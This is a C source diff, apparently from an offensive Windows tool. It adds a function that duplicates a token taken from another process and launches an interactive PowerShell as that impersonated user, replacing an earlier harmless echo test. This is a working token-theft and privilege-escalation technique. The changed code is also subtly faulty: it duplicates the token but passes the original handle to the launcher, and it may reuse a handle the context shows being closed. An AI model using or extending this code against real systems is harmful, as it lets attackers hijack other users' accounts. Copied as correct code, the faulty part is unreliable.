@@ -348,6 +348,46 @@ void launchProcessAsUser(HANDLE hToken) {
     }
 }
 
+void ExecutePowerShellAsUser(HANDLE hToken) {
+    STARTUPINFOA si;
+    PROCESS_INFORMATION pi;
+
+    // Initialize the structures
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    ZeroMemory(&pi, sizeof(pi));
+
+    // Set the startup info to create a console window
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_SHOW;
+
+    // Command to execute PowerShell
+    LPCSTR command = "powershell.exe";
+
+    // Create the process with the impersonated user token
+    if (CreateProcessAsUserA(
+            hToken,           // User token
+            NULL,             // Application name
+            (LPSTR)command,   // Command line
+            NULL,             // Process security attributes
+            NULL,             // Primary thread security attributes
+            FALSE,            // Handle inheritance
+            0,                // Creation flags
+            NULL,             // Use parent's environment block
+            NULL,             // Use parent's starting directory
+            &si,              // Pointer to STARTUPINFO
+            &pi               // Pointer to PROCESS_INFORMATION
+        )) {
+        // Wait for the command to complete
+        WaitForSingleObject(pi.hProcess, INFINITE);
+
+        // Close process and thread handles
+        CloseHandle(pi.hProcess);
+        CloseHandle(pi.hThread);
+    } else {
+        printf("CreateProcessAsUser failed (%d).\n", GetLastError());
+    }
+}
 
 char *impersonate(int pid){
     char *firstUser = getName();
@@ -357,6 +397,7 @@ char *impersonate(int pid){
     char *open = "[-] Failed to obtain duplicated token.\r\n";
     char *newUser = getName();
     char *impersonation = "[+] Impersonation successfull.\r\n";
+    HANDLE hUserToken;
     
     if (hToken) {
         open = "[+] Obtained duplicated token.\r\n";
@@ -367,19 +408,15 @@ char *impersonate(int pid){
             CloseHandle(hToken);
         }
 
-        if(CreateProcessWithTokenW(hToken, 
-                              NULL, 
-                              "cmd.exe /c echo Hello from the impersonated user!", 
-                              NULL, 
-                              NULL, 
-                              FALSE, 
-                              CREATE_NEW_CONSOLE, 
-                              NULL, 
-                              NULL, 
-                              &si, 
-                              &pi)){
-                                printf("HELLO");
-                              }
+        
+        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hUserToken)) {
+            // Prepare the PowerShell command
+            ExecutePowerShellAsUser(hToken);
+            CloseHandle(hUserToken);
+        } else {
+            printf("DuplicateTokenEx failed (%d).\n", GetLastError());
+        }
+
         newUser = getName();
         RevertToSelf();
         CloseHandle(hToken);
